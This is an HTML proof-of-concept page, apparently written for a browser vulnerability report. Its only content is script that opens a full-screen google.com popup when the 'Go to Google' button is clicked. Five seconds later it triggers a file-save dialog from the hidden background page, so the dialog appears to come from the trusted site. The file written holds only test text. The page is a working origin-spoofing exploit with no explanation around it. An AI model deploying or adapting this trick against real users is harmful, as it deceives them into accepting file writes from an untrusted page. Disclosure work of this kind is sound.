<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>PoC</title>
  <style>
    body {
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      font-family: sans-serif;
    }
    button {
      padding: 14px 22px;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>

<button id="go">Go to Google</button>

<script>
  const TRUSTED_URL = "https://www.google.com";
  const DELAY_MS = 5000;

  function openTrustedPopup() {
    const w = screen.availWidth;
    const h = screen.availHeight;
    window.open(
      TRUSTED_URL,
      "popup",
      `width=${w},height=${h},left=0,top=0,resizable=yes,scrollbars=yes`
    );
  }

  async function triggerFileSave() {
    if (!('showSaveFilePicker' in window)) return;

    try {
      const handle = await window.showSaveFilePicker({
        suggestedName: 'document.bin',
        types: [{
          description: 'Binary File',
          accept: { 'application/octet-stream': ['.bin'] }
        }]
      });

      const writable = await handle.createWritable();
      await writable.write('This is only test content');
      await writable.close();
    } catch (e) {
      // user canceled
    }
  }

  document.getElementById("go").addEventListener("click", () => {
    // 1) shift focus to trusted origin
    openTrustedPopup();

    // 2) delayed sensitive action from background window
    setTimeout(() => {
      triggerFileSave();
    }, DELAY_MS);
  });
</script>

</body>
</html>
